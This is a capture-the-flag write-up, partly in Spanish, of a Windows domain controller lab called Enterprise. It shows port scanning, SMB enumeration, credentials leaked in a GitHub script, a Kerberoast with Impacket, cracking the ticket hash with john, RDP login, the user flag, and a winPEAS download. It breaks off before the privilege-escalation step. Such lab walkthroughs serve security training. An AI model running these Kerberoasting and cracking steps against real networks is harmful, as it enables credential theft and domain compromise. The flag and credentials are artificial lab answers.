# Enterprise — Writeup

## Overview
### Enterprise — Writeup
### Enterprise — Writeup
```text
Enterprise es una máquina Windows Server 2019 configurada como Domain Controller. Para el acceso inicial tendremos que enumerar todos los puertos y hasta conseguir unas credenciales válidas. Con estas podremos lanzar un ataque Kerberoast y podremos escalar a un usuario con mayores privilegios. Para escalar a SYSTEM explotaremos la vulnerabilidad Unquoted Service Path.
```

## Enumeration
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ rustscan -a 10.10.234.77 --ulimit 5000 -b 65535 -- -A 
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/kali/.rustscan.toml"
[~] Automatically increasing ulimit value to 5000.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.234.77:53
Open 10.10.234.77:80
Open 10.10.234.77:88
Open 10.10.234.77:135
Open 10.10.234.77:139
Open 10.10.234.77:389
Open 10.10.234.77:445
Open 10.10.234.77:464
Open 10.10.234.77:593
Open 10.10.234.77:636
Open 10.10.234.77:3268
Open 10.10.234.77:3269
Open 10.10.234.77:3389
Open 10.10.234.77:7990
Open 10.10.234.77:9389
Open 10.10.234.77:5985
Open 10.10.234.77:47001
Open 10.10.234.77:49665
Open 10.10.234.77:49668
Open 10.10.234.77:49669
Open 10.10.234.77:49664
Open 10.10.234.77:49666
Open 10.10.234.77:49672
Open 10.10.234.77:49670
Open 10.10.234.77:49676
Open 10.10.234.77:49702
Open 10.10.234.77:49711
Open 10.10.234.77:49830
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

[~] Starting Nmap 7.92 ( https://nmap.org )
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Initiating Ping Scan
Scanning 10.10.234.77 [2 ports]
Completed Ping Scan (1 total hosts)
Initiating Parallel DNS resolution of 1 host.
Completed Parallel DNS resolution of 1 host.
DNS resolution of 1 IPs took 0.01s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan
Scanning 10.10.234.77 [28 ports]
Discovered open port 139/tcp on 10.10.234.77
Discovered open port 80/tcp on 10.10.234.77
Discovered open port 135/tcp on 10.10.234.77
Discovered open port 3389/tcp on 10.10.234.77
Discovered open port 53/tcp on 10.10.234.77
Discovered open port 445/tcp on 10.10.234.77
Discovered open port 49665/tcp on 10.10.234.77
Discovered open port 49711/tcp on 10.10.234.77
Discovered open port 88/tcp on 10.10.234.77
Discovered open port 636/tcp on 10.10.234.77
Discovered open port 9389/tcp on 10.10.234.77
Discovered open port 49670/tcp on 10.10.234.77
Discovered open port 49702/tcp on 10.10.234.77
Discovered open port 49664/tcp on 10.10.234.77
Discovered open port 593/tcp on 10.10.234.77
Discovered open port 49830/tcp on 10.10.234.77
Discovered open port 389/tcp on 10.10.234.77
Discovered open port 3269/tcp on 10.10.234.77
Discovered open port 47001/tcp on 10.10.234.77
Discovered open port 49666/tcp on 10.10.234.77
Discovered open port 3268/tcp on 10.10.234.77
Discovered open port 464/tcp on 10.10.234.77
Discovered open port 49672/tcp on 10.10.234.77
Discovered open port 49669/tcp on 10.10.234.77
Discovered open port 49676/tcp on 10.10.234.77
Discovered open port 5985/tcp on 10.10.234.77
Discovered open port 7990/tcp on 10.10.234.77
Discovered open port 49668/tcp on 10.10.234.77
Completed Connect Scan (28 total ports)
Initiating Service scan
Scanning 28 services on 10.10.234.77
Completed Service scan (28 services on 1 host)
NSE: Script scanning 10.10.234.77.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Nmap scan report for 10.10.234.77
Host is up, received syn-ack (0.19s latency).

PORT      STATE SERVICE       REASON  VERSION
53/tcp    open  domain        syn-ack Simple DNS Plus
80/tcp    open  http          syn-ack Microsoft IIS httpd 10.0
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
|_http-title: Site doesn't have a title (text/html).
|_http-server-header: Microsoft-IIS/10.0
88/tcp    open  kerberos-sec  syn-ack Microsoft Windows Kerberos (server time: :06Z)
135/tcp   open  msrpc         syn-ack Microsoft Windows RPC
139/tcp   open  netbios-ssn   syn-ack Microsoft Windows netbios-ssn
389/tcp   open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
445/tcp   open  microsoft-ds? syn-ack
464/tcp   open  kpasswd5?     syn-ack
593/tcp   open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
636/tcp   open  tcpwrapped    syn-ack
3268/tcp  open  ldap          syn-ack Microsoft Windows Active Directory LDAP (Domain: ENTERPRISE.THM0., Site: Default-First-Site-Name)
3269/tcp  open  tcpwrapped    syn-ack
3389/tcp  open  ms-wbt-server syn-ack Microsoft Terminal Services
| ssl-cert: Subject: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Issuer: commonName=LAB-DC.LAB.ENTERPRISE.THM
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| MD5:   8b33 91bf c925 586a 3a93 4e11 05a5 a84f
| SHA-1: d467 93a9 4e01 07fa 9002 66a5 dd6f ca77 0247 01fc
| -----BEGIN CERTIFICATE-----
| MIIC9jCCAd6gAwIBAgIQJpw+k5NUur9MWxPIr7PdsjANBgkqhkiG9w0BAQsFADAk
| MSIwIAYDVQQDExlMQUItREMuTEFCLkVOVEVSUFJJU0UuVEhNMB4XDTIyMDgwNjE2
| MDkxMFoXDTIzMDIwNTE2MDkxMFowJDEiMCAGA1UEAxMZTEFCLURDLkxBQi5FTlRF
| UlBSSVNFLlRITTCCASIwDQYJKoZIhvcNAQEBBQADggEPADCCAQoCggEBALqGY4L5
| dQOrhQhPBUBmk248Gar4sLGPeTY4KbU34HiOrJNklk7QZbPNG2liprAlPqMtc3p+
| 3OhVMgQrSrtwxwQ1mIKorfWnO8HvvAQ92hoef13jqepeFQOOEDkWn1F2vNjn4D5y
| CVHzBuTGomCCYBb6c+ljkWoW9w/27A+/dyZNOwA7Nfnzz+uw4iDk840ENWgpEeZw
| omVDg00K3CgDaZ+y1TcH3FH+cWZopSwBiECviGuhS7dJNi79onF4zQuB5N6HtxvJ
| NAStQHw3My8T6O/upjTWj+D7wioaQwxJD9HOose8jRlIVm5woqSTe3s+ss+KQpTm
| hgbfzzn0TYMhTaECAwEAAaMkMCIwEwYDVR0lBAwwCgYIKwYBBQUHAwEwCwYDVR0P
| BAQDAgQwMA0GCSqGSIb3DQEBCwUAA4IBAQAEoQeDNycAXc0FWYTp2peNdDsxR24D
| fvYfLny9AKYL/32c2NQ0z7U5GgjI0ii4/S1KaMk0OuzKZ3NQf3plph8u4Mwtml5v
| +Ster58WXaUj7ZAnjUbttAD6eO+MVO9sooRmzJ4oYfNXwEJRwxarb1fa1UAJ6hRT
| +q/RadKXBX1xJ3AlpXvPxlvQWZANq0rQBjT+ZToT8ZBSHO1xOZj7DZyx0i/oOfsq
| cUYxfz2dU69/yKAB44kWynKlnNwEDpuWwNqI/h2+5JOE0IOvBH5wnJ6W8vFdIYPb
| XSugiyu1mk3h4lyVynACKuYKbyd0/zxJeiHlloZ+pdTerV/6DPCWkEJT
|_-----END CERTIFICATE-----
| rdp-ntlm-info: 
|   Target_Name: LAB-ENTERPRISE
|   NetBIOS_Domain_Name: LAB-ENTERPRISE
|   NetBIOS_Computer_Name: LAB-DC
|   DNS_Domain_Name: LAB.ENTERPRISE.THM
|   DNS_Computer_Name: LAB-DC.LAB.ENTERPRISE.THM
|   DNS_Tree_Name: ENTERPRISE.THM
|   Product_Version: 10.0.17763
|_  System_Time: 2022-08-07T16:16:06+00:00
5985/tcp  open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Not Found
|_http-server-header: Microsoft-HTTPAPI/2.0
7990/tcp  open  http          syn-ack Microsoft IIS httpd 10.0
|_http-server-header: Microsoft-IIS/10.0
|_http-title: Log in to continue - Log in with Atlassian account
| http-methods: 
|   Supported Methods: OPTIONS TRACE GET HEAD POST
|_  Potentially risky methods: TRACE
9389/tcp  open  mc-nmf        syn-ack .NET Message Framing
47001/tcp open  http          syn-ack Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-title: Not Found
49664/tcp open  msrpc         syn-ack Microsoft Windows RPC
49665/tcp open  msrpc         syn-ack Microsoft Windows RPC
49666/tcp open  msrpc         syn-ack Microsoft Windows RPC
49668/tcp open  ncacn_http    syn-ack Microsoft Windows RPC over HTTP 1.0
49669/tcp open  msrpc         syn-ack Microsoft Windows RPC
49670/tcp open  msrpc         syn-ack Microsoft Windows RPC
49672/tcp open  msrpc         syn-ack Microsoft Windows RPC
49676/tcp open  msrpc         syn-ack Microsoft Windows RPC
49702/tcp open  msrpc         syn-ack Microsoft Windows RPC
49711/tcp open  msrpc         syn-ack Microsoft Windows RPC
49830/tcp open  msrpc         syn-ack Microsoft Windows RPC
Service Info: Host: LAB-DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-security-mode: 
|   3.1.1: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2022-08-07T16:16:09
|_  start_date: N/A
|_clock-skew: mean: 0s, deviation: 0s, median: 0s
| p2p-conficker: 
|   Checking for Conficker.C or higher...
|   Check 1 (port 32317/tcp): CLEAN (Couldn't connect)
|   Check 2 (port 50961/tcp): CLEAN (Couldn't connect)
|   Check 3 (port 52180/udp): CLEAN (Failed to receive data)
|   Check 4 (port 12817/udp): CLEAN (Timeout)
|_  0/4 checks are positive: Host is CLEAN or ports are blocked

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE
Completed NSE
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE
Completed NSE
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 82.49 seconds
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ crackmapexec smb 10.10.234.77                             
SMB         10.10.234.77    445    LAB-DC           [*] Windows 10.0 Build 17763 x64 (name:LAB-DC) (domain:LAB.ENTERPRISE.THM) (signing:True) (SMBv1:False)

Ahora enumeramos los recursos compartidos con smbmap:
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ smbmap -H 10.10.234.77 -u 'sd9'                           
[+] Guest session       IP: 10.10.234.77:445    Name: 10.10.234.77                                      
        Disk                                                    Permissions     Comment
        ----                                                    -----------     -------
        ADMIN$                                                  NO ACCESS       Remote Admin
        C$                                                      NO ACCESS       Default share
        Docs                                                    READ ONLY
        IPC$                                                    READ ONLY       Remote IPC
        NETLOGON                                                NO ACCESS       Logon server share 
        SYSVOL                                                  NO ACCESS       Logon server share 
        Users                                                   READ ONLY       Users Share. Do Not Touch!

Vamos a la web del puerto 7990

    ATLASSIAN
Reminder to all Enterprise-THM Employees:
We are moving to Github!

Log in to your account

Nos dice que el site se ha movido a Github así que buscamos allí.

search google -> github "Enterprise-THM" https://github.com/jesusgavancho/About-Us (not found)

searching user Nik-enterprise.dev -> https://github.com/jesusgavancho/mgmtScript.ps1 (found)

Import-Module ActiveDirectory
$userName = 'nik'
$userPassword = 'ToastyBoi!'
$psCreds = ConvertTo-SecureString $userPassword -AsPlainText -Force
$Computers = New-Object -TypeName "System.Collections.ArrayList"
$Computer = $(Get-ADComputer -Filter * | Select-Object Name)
for ($index = -1; $index -lt $Computer.count; $index++) { Invoke-Command -ComputerName $index {systeminfo} }

Llegamos a este script que contiene unas credenciales:

Con estas credenciales podemos acceder por rpcclient:
```
```text
┌──(kali㉿kali)-[~/Downloads]
└─$ rpcclient -U nik lab.enterprise.thm 
Password for [WORKGROUP\nik]: ToastyBoi!
rpcclient $> enumdomusers
user:[Administrator] rid:[0x1f4]
user:[Guest] rid:[0x1f5]
user:[krbtgt] rid:[0x1f6]
user:[atlbitbucket] rid:[0x3e8]
user:[bitbucket] rid:[0x452]
user:[nik] rid:[0x453]
user:[replication] rid:[0x454]
user:[spooks] rid:[0x455]
user:[korone] rid:[0x456]
user:[banana] rid:[0x457]
user:[Cake] rid:[0x458]
user:[contractor-temp] rid:[0x45c]
user:[varg] rid:[0x45d]
user:[joiner] rid:[0x45f]

Y obtenemos una lista de usuarios:
```
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ cat users2.txt                                                          
Administrator
Guest
krbtgt
atlbitbucket
bitbucket
nik
replication
spooks
korone
banana
Cake
contractor-temp
varg
joiner

Lanzamos un ataque kerberoast:
```

## Exploitation
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ python3 /usr/share/doc/python3-impacket/examples/GetUserSPNs.py lab.enterprise.thm/nik:ToastyBoi! -dc-ip 10.10.234.77 -request
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

ServicePrincipalName  Name       MemberOf                                                     PasswordLastSet             LastLogon                   Delegation 
--------------------  ---------  -----------------------------------------------------------  --------------------------  --------------------------  ----------
HTTP/LAB-DC           bitbucket  CN=sensitive-account,CN=Builtin,DC=LAB,DC=ENTERPRISE,DC=THM  .333272  .570158             

[-] CCache file is not found. Skipping...
$krb5tgs$23$*bitbucket$LAB.ENTERPRISE.THM$lab.enterprise.thm/bitbucket*$5d9fa084e7c88c0097b1d6dfd05d47ec$eef017baf597f14025a0be6f71337199dbc8840ada5cd86591e036ba2f31ca6550edf5a9eddec2f0940bcc6269dcf224160912eeea119451944976b740c2a81b20ba1e1de442781e7f04ba0afc37f4b02a365db8b64f8799546085a00e7a4316036a44ebda68e4c564a2485fb8f098b48270f342b980a1dac40dda194398c2f8404463085035012ca03c07fa27b1fc075fe024e0dd6267b6cc7de34e3893132e6a69378236f7b15d406aa6fe271e0d79fdfd1aa2868948cabac565abca0b06cc651152a56aa7535d6a53742f056dcbbcfa60392f743ac6989230c27958d35307c9667b0c3ea6c6e28a5fc422a0e29edc1ae319ff0d92956930d264d92529a721a178cab8ba4a7f871a5428795a37258c73b97d5398d6c568ce8c4fba050f1484f587d624e1263de8d59698196cfcc654da8e77421ca2a0c4472bf29dd4d84701b3a2208adfea830a482d06c390982fee181eb6b1bff4d3c17af8f2779d34247d82fe9018a8411b70c767c56016da834c5838d2758c0c2e0a26cdbbd0c355c4ff490ed5ba3cbceb75706d87de0ad13bf46a271667781d1ddb394fd6f3864220115f4ab8bbdf55213703e87e993477297e7b60254cc9c294d8ee9550a7420ff404a2b6e25f6ec1fc2e69d3dde485348957f1361b690607d0ad6d79c1e9bcf43425f7192c2cd05f53e7d52ec5652a941d7a9d82c0cfbaed233177cbde4cc657904f2cdf26fddc8f7844b0318073148860c8efc4bafd039e0ec3da8ebc3e39471902808511bb0335b6e7ecde0ababb742f0729a3365905d9849f019756169c9a97b0ddfb43d86f9bf0245beb3b1114741f41b528c35b1746ab6b30cf9f8b785057d99abdee1355cfc1b802f9efa22bfe5faeaa13e1ae524d326f94ad10d6f32cfe18fe6dfcbd16d7d3f8ae2ad24d474cb1601d91e6dd21beb0111e1c80d880694d1ab0dacc78d98be16023080f5da6a6a6b37a5a45193f7bf3d0b6d827b742750bedf27d1955d35094fcb31ae64f49cd7661b35272a997705a2ce1610265609cd6e0d1219c4bc53a1f7518dc95899060c32555e3a44ed9f3f1e0615eb50e1180c0198c60a62728d972084582dae52f7536fd379373c36cc4d8076e695682c97935172b456de93b44382033750d1eb6ab9ab39c8d44b0aba1f6d336e08cb00e6fb27a1a953c9a168232675a7f62152f909ca0f21064c3b1476b57f7be5fff8cb4dc4e0c860cd566c1490a1d2d7186370be1a57184d0f54141db27012263c6d3469372a4edd165bfd5b1345673df2e55e433d0ec7956ac2472a9bfb9566debc971a2c3d341890e7a60af631e17ad71c57d226f8f903c92246cf8d1631f0ba749e42ebe8bd521

Crackeamos el hash:

─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
littleredbucket  (?)     
1g 0:00:00:01 DONE () 0.8064g/s 1266Kp/s 1266Kc/s 1266KC/s livelife93..liss27
Use the "--show" option to display all of the cracked passwords reliably
Session completed.
```
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt hash --format=krb5tgs
Using default input encoding: UTF-8
Loaded 1 password hash (krb5tgs, Kerberos 5 TGS etype 23 [MD4 HMAC-MD5 RC4])
No password hashes left to crack (see FAQ)

***connect rdp***

Con estas credenciales podemos acceder por rdp:
```

## Privilege Escalation
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ xfreerdp /u:bitbucket /p:'littleredbucket' /v:lab.enterprise.thm /size:90%
[12:46:09:346] [13214:13215] [WARN][com.freerdp.crypto] - Certificate verification failure 'self signed certificate (18)' at stack position 0
[12:46:09:346] [13214:13215] [WARN][com.freerdp.crypto] - CN = LAB-DC.LAB.ENTERPRISE.THM
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - The hostname used for this connection (lab.enterprise.thm:3389) 
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] -      LAB-DC.LAB.ENTERPRISE.THM
[12:46:09:347] [13214:13215] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for lab.enterprise.thm:3389 (RDP-Server):
        Common Name: LAB-DC.LAB.ENTERPRISE.THM
        Subject:     CN = LAB-DC.LAB.ENTERPRISE.THM
        Issuer:      CN = LAB-DC.LAB.ENTERPRISE.THM
        Thumbprint:  d5:0f:e6:bd:c8:a4:0b:b4:df:99:6a:bb:61:ff:2c:ab:3b:ee:ab:0f:63:a9:ec:33:22:fa:38:bb:a4:c9:90:ee
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
[12:46:15:580] [13214:13215] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[12:46:16:895] [13214:13215] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
[12:46:16:895] [13214:13215] [INFO][com.freerdp.gdi] - Remote framebuffer format PIXEL_FORMAT_BGRA32
[12:46:17:039] [13214:13215] [INFO][com.freerdp.channels.rdpsnd.client] - [static] Loaded fake backend for rdpsnd
[12:46:17:039] [13214:13215] [INFO][com.freerdp.channels.drdynvc.client] - Loading Dynamic Virtual Channel rdpgfx
[12:46:18:360] [13214:13215] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[12:46:18:471] [13214:13215] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[12:46:19:341] [13214:13215] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[12:46:19:518] [13214:13215] [WARN][com.freerdp.client.x11] - xf_lock_x11_:     [1] recursive lock from xf_process_x_events
[12:46:19:993] [13214:13215] [INFO][com.freerdp.client.x11] - Logon Error Info LOGON_FAILED_OTHER [LOGON_MSG_SESSION_CONTINUE]

What is the contents of User.txt (C:\Desktop\user.txt)
THM{ed882d02b34246536ef7da79062bef36}

download winpeas (to check priv esc in windows) (linpeas check priv esc in linux)
```
```text
┌──(kali㉿kali)-[~/Downloads/Enterprise]
└─$ wget https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
--  https://github.com/carlospolop/PEASS-ng/releases/latest/download/winPEASany_ofs.exe
